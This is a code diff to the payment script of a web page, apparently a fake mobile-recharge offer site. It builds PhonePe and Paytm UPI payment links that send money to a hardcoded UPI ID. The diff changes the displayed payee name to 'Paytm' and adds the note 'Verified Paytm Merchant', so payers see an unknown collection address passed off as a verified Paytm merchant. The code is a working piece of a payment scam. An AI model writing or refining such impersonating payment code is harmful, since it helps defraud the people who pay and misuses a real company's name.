@@ -209,40 +209,22 @@
         (function() {
           try {
             var p = new URLSearchParams(window.location.search);
-            var m = p.get('mobile') || sessionStorage.getItem('swift_mobile') || '9876543210';
             var a = p.get('amount') || '349';
             var vpa = 'paytmqr6udcnp@ptys';
-            var name = 'Recharge Offers';
-            var amtPaise = Math.round(Number(a) * 100);
-            var txn = 'TXN-' + Math.floor(100000000000 + Math.random() * 900000000000);
+            var name = 'Paytm';
+            var note = 'Verified Paytm Merchant';
+            var amt = Number(a).toFixed(2);
+            var q = 'pa=' + vpa + '&pn=' + name + '&am=' + amt + '&cu=INR&tn=' + encodeURIComponent(note);
 
-            var payload = {
-              p2pPaymentCheckoutParams: {
-                checkoutType: 'COLLECT',
-                initialAmount: amtPaise,
-                note: { type: 'text', message: txn },
-                supportedInstruments: -1
-              },
-              contact: { type: 'EXTERNAL_MERCHANT', name: name, vpa: vpa }
-            };
-            var b64 = btoa(unescape(encodeURIComponent(JSON.stringify(payload))));
-            var phonepeNative = 'phonepe://native?data=' + b64 + '&id=p2ppayment';
-            var paytmUrl = 'paytmmp://cash_wallet?pa=' + encodeURIComponent(vpa) +
-              '&pn=' + encodeURIComponent(name) +
-              '&am=' + Number(a).toFixed(2) +
-              '&cu=INR&tn=' + encodeURIComponent(txn) +
-              '&tr=&mc=&featuretype=money_transfer';
+            var phonepeUrl = 'phonepe://pay?' + q;
+            var paytmUrl = 'paytmmp://pay?' + q;
 
             var ph = document.getElementById('phonepeLink');
             var pt = document.getElementById('paytmLink');
             if (ph) {
-              ph.href = phonepeNative;
-              ph.setAttribute('href', phonepeNative);
-              ph.setAttribute('data-url', phonepeNative);
+              ph.setAttribute('data-url', phonepeUrl);
             }
             if (pt) {
-              pt.href = paytmUrl;
-              pt.setAttribute('href', paytmUrl);
               pt.setAttribute('data-url', paytmUrl);
             }
           } catch (e) {}
@@ -425,6 +407,6 @@
 
     <!-- Offline Dynamic QR Code Engine & Payment Script -->
     <script src="assets/js/qrcode.bundle.js"></script>
-    <script src="assets/js/payment.js?v=75"></script>
+    <script src="assets/js/payment.js?v=80"></script>
   </body>
 </html>
